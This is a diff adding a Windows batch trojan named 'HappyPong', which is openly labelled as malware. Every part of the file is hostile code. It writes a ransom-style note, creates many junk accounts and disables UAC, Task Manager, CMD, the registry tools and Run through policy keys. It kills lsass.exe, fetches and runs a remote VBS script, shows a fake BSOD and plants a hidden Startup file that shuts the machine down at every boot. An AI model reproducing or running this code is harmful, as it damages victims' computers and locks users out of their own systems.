@@ -1,0 +1,414 @@
+rem Trojan.BAT.HappyPong
+rem Made by Kevin Reagan
+
+@echo off
+goto DoNotPressOKOrElse
+
+:DoNotPressOKOrElse
+mshta.exe vbscript:Execute("MsgBox ""fukpong.exe is not a valid Win32 application!"", vbOkOnly+vbCritical, ""fukpong.exe""")(window.close)
+ping -n 20 127.0.0.1>nul
+goto UrMomsEmail
+
+:UrMomsEmail
+echo Microsoft Outlook created a .txt document. You have just recieved a new email. >> note.txt
+echo Topic: Did you just executed Word? Yes! You recieved an email from someone you have met and befriended... >> note.txt
+echo Sent from: happy@happypong.com at %time%, %date% to %username%@outlook.com >> note.txt
+echo ===================================== >> note.txt
+echo READ THIS EMAIL FROM YOUR OLD FRIEND! >> note.txt
+echo Thank you for executing HappyPong! :) >> note.txt
+echo HOW TO PLAY: >> note.txt
+echo Press green flag to start the game! >> note.txt
+echo Use your mouse to play the game! >> note.txt
+echo Do not let the ball go outside! >> note.txt
+echo if you do, you will not have score! Instead, the other player will have their score! :) >> note.txt
+echo Good luck! >> note.txt
+echo CREDITS: >> note.txt
+echo Thanks to these websites for helping me!: :) >> note.txt
+echo google.com >> note.txt
+echo digitalcitizen.life >> note.txt
+echo superuser.com >> note.txt
+echo instructables.com (content.instructables.com) >> note.txt
+echo hitech-us.com >> note.txt
+echo github.com (NTFS123: Trojan.VBS.Bolbi, Trojan.VBS.Bolbi V2, Trojan.VBS.Jesus) >> note.txt
+echo youtube.com (danooct1, FlyTech Videos, 4096, Kane Pixels, 2013Windows8.1, Come on Windows, special thanks to ManlyBadassHero) >> note.txt
+echo msfn.org >> note.txt
+echo y2mate.com >> note.txt
+echo wikihow.com >> note.txt
+echo tek-tips.com >> note.txt
+echo scratch.mit.edu (dixiklo) >> note.txt
+echo askvg.com >> note.txt
+echo freeconvert.com >> note.txt
+echo imgur.com >> note.txt
+echo icon-icons.com >> note.txt
+echo en.wikiversity.org >> note.txt
+echo makeuseof.com >> note.txt
+echo tb.rg-adguard.net >> note.txt
+echo community.spiceworks.com >> note.txt
+echo thewindowsclub.com >> note.txt
+echo tomsguide.com >> note.txt
+echo microsoft.com (support.microsoft.com) >> note.txt
+echo The game idea is on backrooms-wiki.wikidot.com (Entity666 The Backrooms Wiki). >> note.txt
+echo These apps helped me: >> note.txt
+echo Google Chrome >> note.txt
+echo VMware Workstation (testing Game?) >> note.txt
+echo Bat To Exe Converter >> note.txt
+echo Notepad >> note.txt
+echo PowerPoint 2019 >> note.txt
+echo Microsoft Edge >> note.txt
+echo Command Prompt >> note.txt
+echo VBscript >> note.txt
+echo Registry Editor >> note.txt
+echo And more... They are just commands... In the SYSTEM32 folder... >> note.txt
+echo And one more thing I forgot to tell you that... YOUR COMPUTER HAS BEEN TRASHED! >> note.txt
+echo TO UNTRASH YOUR COMPUTER, PLAY THE PONG GAME THEN I WILL UNTRASH IT! >> note.txt 
+echo YOU HAVE 10 MINUTES TO PREP BEFORE YOUR EX ENDS YOU AND YOUR COMPUTER EXPLODE!(joke) >> note.txt
+echo CHECK YOUR %username% FOLDER, SOME FOLDERS INSIDE THAT FOLDER ARE DELETED! >> note.txt 
+echo DO NOT TRY TO UNINFECT YOUR COMPUTER WITH TASK MANAGER AND COMMAND PROMPT, IT IS DISABLED! >> note.txt
+echo IT'S OKAY IF YOU DO NOT WANT TO PLAY THE GAME! >> note.txt 
+echo IF YOU CLOSE THE WEBPAGE, IT DOESN'T MEAN THAT YOU REMOVED THE VIRUS, IT MEANS YOU ARE MAKING A BIG PROBLEM, YOU LOST THE GAME (UNLESS YOU REMEMBER THE GAME URL)! >> note.txt
+echo IT'S TOO LATE! SO DO NOT DO THAT! >> note.txt
+echo UNDERSTOOD? GOOD! >> note.txt
+echo CONTACT US: 606 606 6006 or happy@happypong.com (666 HAPPY STREET, HOUSTON, TEXAS, USA) >> note.txt
+echo IF YOU ARE OUTSIDE THE UNITED STATES, USE THE PHONE NUMBER INSTEAD OF THE ADDRESS. AND PLEASE SPEAK ENGLISH WHEN YOU CALL US BY PHONE, WE UNDERSTAND ENGLISH ONLY! >> note.txt
+echo IF YOU DONT UNDERSTAND ENGLISH, YOU ARE AN ENGLISH NOOB! AND WE WILL IGNORE YOUR TRASHY PHONE CALL YOU NERD! >> note.txt
+echo IF YOU SPEAK ON THE PHONE OR EMAIL US THAT WE ARE ENGLISH NOOBS, THEN WE WILL SLAP UR COMPUTER!!! >> note.txt
+echo -From Mr.Happy (happy@happypong.com), Mr.Pong (pong@happypong.com) and Mr.gnopyppah (dankestemail@gnopyppahisbest.net) - Your friends since: >> note.txt
+echo 6 years, 6 months, 6 weeks, 6 days, 6 hours, 6 minutes and 6 seconds ago >> note.txt
+echo (June 6 2000, 6:06AM) >> note.txt
+echo And do you know what is today! June 6 2006! >> note.txt
+echo I think you are confused now... Today is %date%. But... THIS COMPUTER HAS BEEN INFECTED BY A TIME MACHINE! >> note.txt
+echo ===================================== >> note.txt
+echo Topic: Someone told me to email you... >> note.txt
+echo Sent from danooct1press@gmail.com at %time%, %date% to %username%@outlook.com >> note.txt
+echo ===================================== >> note.txt
+echo Dear %username%, >> note.txt
+echo Hello. I am Dan. Someone told me to email you. How was your day? Great? Well... Did someone send you a game? I'm sorry to tell you that your computer has been infected with a virus... But don't worry! You can download antivirus from here: >> note.txt
+echo https://www.malwarebytes.com/mwb-download/thankyou?aid=37335 >> note.txt
+echo I hope this removed the virus. >> note.txt
+echo Best Regards, >> note.txt
+echo Daniel >> note.txt
+echo My YouTube channel: youtube.com/danooct1 >> note.txt
+echo My email: danooct1press@gmail.com >> note.txt
+echo Twitter: twitter.com/danooct1 >> note.txt
+echo And please note that I will ban you if you spam. >> note.txt
+goto WeAreWelcoming
+
+:WeAreWelcoming
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+net user LOVEYOU%random% %random% /add
+taskkill /f /im ms-settings:.exe /im snippingtool.exe /im taskmgr.exe /im msconfig.exe /im powershell.exe /im wmplayer.exe /im notepad.exe /im calc.exe /im write.exe /im mspaint.exe /im cortana.exe /im control.exe /im ms-windows-store:.exe /im regedit.exe /im iexpress.exe /im winver.exe /im explorer.exe
+start explorer.exe
+goto ThrowTheComputerToTrash
+
+:ThrowTheComputerToTrash
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Policies\Microsoft\Windows\System /v DisableGPO /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /t REG_DWORD /d 4 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMFUprogramsList /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSecurityTab /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetTaskbar /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoPinningToTaskbar /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v TaskbarNoPinnedList /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSaveSettings /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinkeys /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideClock /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMyGames /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 4 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v StartMenuLogOff /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoCommonGroups /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFavoritesMenu /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRecentDocsMenu /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetFolders /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoAddPrinter /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMHelp /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoChangeStartMenu /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMMyDocs /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSMMyPictures /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMyDocuments /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMyDownloads /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Policies\Microsoft\Windows\Personalization /v NoLockScreen /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Policies\Microsoft\WindowsStore /v RemoveWindowsStore /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Policies\Microsoft\WindowsStore /v DisableStoreApps /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Policies\Microsoft\MicrosoftEdge\Main /v AllowPreLaunch /t REG_DWORD /d 0 /f
+reg ADD HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet /v EnableActiveProbing /t REG_DWORD /d 0 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCAVolume /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCANetwork /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideSCAPower /t REG_DWORD /d 1 /f
+reg ADD HKLM\Software\Policies\Microsoft\Windows\System /v DontDisplayNetworkSelectionUI /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Policies\Microsoft\MMC /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+reg ADD HKCU\Software\Microsoft\Windows /v SearchboxTaskbarMode /t REG_DWORD /d 0 /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticecaption /t REG_SZ /d GET_READY_TO_BE_KISSED! /f
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticetext /t REG_SZ /d I_ALWAYS_LOVE_YOU!!!_PRESS_OK_AND_ENTER_YOUR_PASSWORD_TO_BE_KISSED_MY_FRIEND!!!_ILOVEYOU!!!_SOS!!!1 /f
+goto GoToTheBackrooms
+
+:GoToTheBackrooms
+md C:\WINDOWS\HappyPong
+cd C:\WINDOWS\HappyPong
+echo on error resume next >> logon.vbs
+echo Set WshShell = CreateObject ("wscript.shell") >> logon.vbs
+echo WshShell.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","https://i.imgur.com/DAipxxw.jpeg", "REG_SZ" >> logon.vbs
+echo WshShell.Regwrite "HKCU\Control Panel\International\s1159", "HAPPY","REG_SZ" >> logon.vbs
+echo WshShell.Regwrite "HKCU\Control Panel\International\s2359", "HAPPY","REG_SZ" >> logon.vbs
+start logon.vbs
+goto NoMoreExplorer
+
+:NoMoreExplorer
+echo taskkill /f /im msedge.exe >> explorer.bat
+echo taskkill /f /im chrome.exe >> explorer.bat
+echo taskkill /f /im firefox.exe >> explorer.bat
+echo taskkill /f /im iexplore.exe >> explorer.bat
+echo taskkill /f /im explorer.exe >> explorer.bat
+echo start halloween2.vbs >> explorer.bat
+goto IAmAlwaysHappy
+
+:IAmAlwaysHappy
+echo on error resume next >> shutdown.vbs
+echo Set WshShell = CreateObject ("wscript.shell") >> shutdown.vbs
+echo wscript.sleep 600000 >> shutdown.vbs
+echo WshShell.Run "explorer.bat" >> shutdown.vbs
+echo wscript.sleep 5000 >> shutdown.vbs
+echo WshShell.Run "regret.vbs" >> shutdown.vbs
+echo wscript.sleep 60000 >> shutdown.vbs
+echo WshShell.Run "taskkill /f /im lsass.exe" >> shutdown.vbs
+start shutdown.vbs
+goto ChangeUrRealName
+
+:ChangeUrRealName
+echo wmic useraccount where name='%username%' set FullName='LOVEYOU' >> username.bat
+echo wmic useraccount where name='%username%' rename 'LOVEYOU' >> username.bat
+goto NowItsTooLate
+
+:NowItsTooLate
+echo a=msgbox("Thank you for playing my game! But you are tricked! You cannot get your computer back! HAHAHAHAHAHAHAHAHA!!!!! PREPARE FOR A SHUTDOWN BATTLE!!!!!",0+64,"YOU ARE JUST WASTING YOUR TIME PLAYING PONG GAME AREN'T YOU???") >> regret.vbs
+goto DownloadMEMZ
+
+:DownloadMEMZ
+echo on error resume next >> download1.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download1.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download1.vbs
+echo xHttp.Open "GET", "https://raw.githubusercontent.com/HappyPong666/MuSicFk/main/MusicFuk.mp3", False >> download1.vbs
+echo xHttp.Send >> download1.vbs
+echo with bStrm >> download1.vbs
+echo   .type = 1 '//binary >> download1.vbs
+echo   .open >> download1.vbs
+echo   .write xHttp.responseBody >> download1.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\MusicFuk.mp3", 2 '//overwrite >> download1.vbs
+echo end with >> download1.vbs
+echo on error resume next >> download2.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download2.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download2.vbs
+echo xHttp.Open "GET", "https://raw.githubusercontent.com/HappyPong666/Musicvbs/main/music.vbs", False >> download2.vbs
+echo xHttp.Send >> download2.vbs
+echo with bStrm >> download2.vbs
+echo   .type = 1 '//binary >> download2.vbs
+echo   .open >> download2.vbs
+echo   .write xHttp.responseBody >> download2.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\music.vbs", 2 '//overwrite >> download2.vbs
+echo end with >> download2.vbs
+echo on error resume next >> download3.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download3.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download3.vbs
+echo xHttp.Open "GET", "https://i.imgur.com/MZNPgFt.jpg", False >> download3.vbs
+echo xHttp.Send >> download3.vbs
+echo with bStrm >> download3.vbs
+echo   .type = 1 '//binary >> download3.vbs
+echo   .open >> download3.vbs
+echo   .write xHttp.responseBody >> download3.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\shit.jpg", 2 '//overwrite >> download3.vbs
+echo end with >> download3.vbs
+start download1.vbs
+start download2.vbs
+start download3.vbs
+goto RemoveUrUglyWallpaper
+
+:RemoveUrUglyWallpaper
+echo dim shell >> change.vbs
+echo Set shell = WScript.CreateObject("WScript.Shell") >> change.vbs
+echo wallpaper = "C:\WINDOWS\HappyPong\shit.jpg" >> change.vbs
+echo shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaper >> change.vbs
+echo shell.Run "C:\WINDOWS\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True >> change.vbs
+goto SpawnFreddyOnComputer
+
+:SpawnFreddyOnComputer
+(
+echo ^<html^>^<head^>^<title^>ALERT!!!^</title^> 
+echo. 
+echo ^<hta:application id="oBVC" 
+echo applicationname="SHITBSOD!!!"  
+echo version="4.2.0" 
+echo maximizebutton="no" 
+echo minimizebutton="no" 
+echo sysmenu="no" 
+echo Caption="no" 
+echo windowstate="maximize"/^> 
+echo. 
+echo ^</head^>^<body bgcolor="#FF0000" scroll="no"^> 
+echo ^<font face="Lucida Console" size="4" color="white"^> 
+echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> 
+echo. 
+echo ^<p^>COMPUTER_TRASHED_BY_HAPPYPONG^</p^> 
+echo. 
+echo ^<p^>If this is the first time you have seen this stop error screen, play the pong game. Do not restart your computer. If you restart, your computer will explode. If this is the second, third or fourth time you have seen this stop error screen, keep playing the pong game. At this point your computer is pretty trashed up. ^</p^> 
+echo. 
+echo ^<p^>Antiviruses will not help you. So do not install them. Task manager is disabled! And one more thing... You cannot fix your computer once it is trashed! Registry editor is disabled too, you cannot enable task manager! Are you a CMD genius? Well... CMD is disabled! No more REG command! Well... You can use Run? No, it is restricted! There is nowhere to escape!^</p^> 
+echo. 
+echo ^<p^>Safe mode will not help you! If you delete the batch file in the startup folder, your computer is still trashed! If you are using Windows 8 and up, then it has been fuked by MEMZ!^</p^> 
+echo. 
+echo ^<p^>These are the important technical informations:^</p^> 
+echo. 
+echo ^<p^>*** STOP: 0x69696969 ^(0x42042042,0x04204204,0x20420420,0x42042042^)^</p^> 
+echo. 
+echo. 
+echo ^<p^>***  happy.sys - Address 42042042 base at 04204204, DateStamp 20420420^</p^> 
+echo. 
+echo ^<p^>Beginning dump of physical memory^</p^> 
+echo ^<p^>Physical memory dump complete.^</p^> 
+echo ^<p^>Contact us at: happy@happypong.com or 606 606 6006.^</p^> 
+echo.
+echo. 
+echo ^</font^> 
+echo ^</body^>
+echo.
+echo ^<script language="javascript"^>
+echo ^</script^>
+echo.  
+echo ^</html^> 
+) > bsod.hta 
+goto TodayIsHalloween
+
+:TodayIsHalloween
+echo Dim sapi >> halloween.vbs
+echo Set sapi=CreateObject("sapi.spvoice") >> halloween.vbs
+echo sapi.Speak "Hello! Welcome to happy pong game! Hope you like it!" >> halloween.vbs
+echo wscript.sleep 5000 >> halloween.vbs
+echo sapi.Speak "Hey, why are not you answering?" >> halloween.vbs
+echo wscript.sleep 5000 >> halloween.vbs
+echo sapi.Speak "OK. I know you cannot speak to me. But now I will play some good music. Sound amazing?" >> halloween.vbs
+echo Dim sapi >> halloween1.vbs
+echo Set sapi=CreateObject("sapi.spvoice") >> halloween1.vbs
+echo sapi.Speak "A problem has been detected and windows has been suspended for the rest of your life!" >> halloween1.vbs
+echo Dim sapi >> halloween2.vbs
+echo Set sapi=CreateObject("sapi.spvoice") >> halloween2.vbs
+echo sapi.Speak "Hey! I am super happy to tell you that your computer has been trashed by HappyPong! Malware Bytes will not help you! You just recieved a fake email from Daniel! Hehe get scammed noob!" >> halloween2.vbs
+goto IAmGriffpatch
+
+:IAmGriffpatch
+echo on error resume next >> pong.vbs
+echo Set WshShell = CreateObject ("wscript.shell") >> pong.vbs
+echo wscript.sleep 3000 >> pong.vbs
+echo WshShell.Run "https://i.imgur.com/ilGkG6C.jpeg" >> pong.vbs
+echo WshShell.Run "halloween.vbs"
+echo wscript.sleep 7000 >> pong.vbs
+echo WshShell.Run "https://scratch.mit.edu/projects/742827606/fullscreen" >> pong.vbs
+start pong.vbs
+goto SayGoodbye
+
+:SayGoodbye
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+echo shutdown -s -t 0 >> SHUTDOWN.bat
+echo msg * SHUTDOWN BATTLE STARTING!... FOREVER! >> SHUTDOWN.bat
+attrib +r +h +s C:\WINDOWS\HappyPong
+attrib +r +h +s C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SHUTDOWN.bat
+ping -n 35 127.0.0.1>nul
+goto GoBackToThePast
+
+:GoBackToThePast
+cd C:\WINDOWS\HappyPong
+date 6/6/2006
+start username.bat
+start music.vbs
+start change.vbs
+goto NoMoreInternet
+
+:NoMoreInternet
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoNetworkConnections /t REG_DWORD /d 1 /f 
+reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f
+ping -n 100 127.0.0.1>nul
+goto FreddyFazbearJumpscareGaveMeHeartAttack
+
+:FreddyFazbearJumpscareGaveMeHeartAttack
+cd C:\WINDOWS\HappyPong
+start bsod.hta
+start halloween1.vbs
+ping -n 10 127.0.0.1>nul
+taskkill /f /im mshta.exe
+ping -n 60 127.0.0.1>nul
+start bsod.hta
+start halloween1.vbs
+ping -n 10 127.0.0.1>nul
+taskkill /f /im mshta.exe
+ping -n 60 127.0.0.1>nul
+start bsod.hta
+start halloween1.vbs
+ping -n 10 127.0.0.1>nul
+taskkill /f /im mshta.exe
+ping -n 60 127.0.0.1>nul
+start bsod.hta
+start halloween1.vbs
+ping -n 10 127.0.0.1>nul
+taskkill /f /im mshta.exe
+ping -n 60 127.0.0.1>nul
+start bsod.hta
+start halloween1.vbs
+ping -n 10 127.0.0.1>nul
+taskkill /f /im mshta.exe
+ping -n 60 127.0.0.1>nul
+start bsod.hta
+start halloween1.vbs
+ping -n 10 127.0.0.1>nul
+taskkill /f /im mshta.exe
+ping -n 60 127.0.0.1>nul
+start bsod.hta
+start halloween1.vbs
+ping -n 10 127.0.0.1>nul
+taskkill /f /im mshta.exe
+ping -n 60 127.0.0.1>nul
+start bsod.hta
+start halloween1.vbs
+ping -n 10 127.0.0.1>nul
+taskkill /f /im mshta.exe
